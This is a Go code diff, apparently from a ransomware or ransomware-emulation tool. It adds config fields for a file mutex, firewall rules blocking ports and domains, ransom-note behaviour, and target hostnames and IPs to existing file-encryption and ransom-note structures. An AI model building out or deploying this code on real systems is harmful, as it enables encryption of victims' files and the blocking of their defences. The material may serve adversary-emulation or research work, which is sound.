@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"github.com/Anonghost720/ecc"
 	"golang.org/x/crypto/chacha20"
+	"strings"
 )
 
 type Config struct {
@@ -19,6 +20,11 @@ type Config struct {
 	FileExtensionInclusions []string      `yaml:"file_extension_targets"`
 	EncryptionPercent       int
 	ThresholdFullEncrypt    int64
+	UniqueFileMutex         string   `yaml:"unique_file_mutex"`
+	Ports                   []int    `yaml:"port_blocks"`
+	Domains                 []string `yaml:"domain_blocks"`
+	FWRuleName              string   `yaml:"fw_rule_name"`
+	FWDomainRuleName        string   `yaml:"fw_domain_rule_name"`
 }
 
 type RansomActor struct {
@@ -29,6 +35,7 @@ type RansomActor struct {
 	Note            string   `yaml:"note"`
 	Cipher          string   `yaml:"cipher"`
 	AsymCipher      string   `yaml:"asym"`
+	NoteBehavior    string   `yaml:"note_behavior"`
 }
 
 type LogLevel string
@@ -180,4 +187,16 @@ func (s *SymHandler) Encrypt(ct []byte, pt []byte) {
 	} else if s.System == "aes256" {
 		s.AESCipher.XORKeyStream(ct, pt)
 	}
+}
+
+// For passing in target hostnames/IPs
+type StringSlice []string
+
+func (s *StringSlice) String() string {
+	return strings.Join(*s, ",")
+}
+
+func (s *StringSlice) Set(value string) error {
+	*s = strings.Split(value, ",")
+	return nil
 }
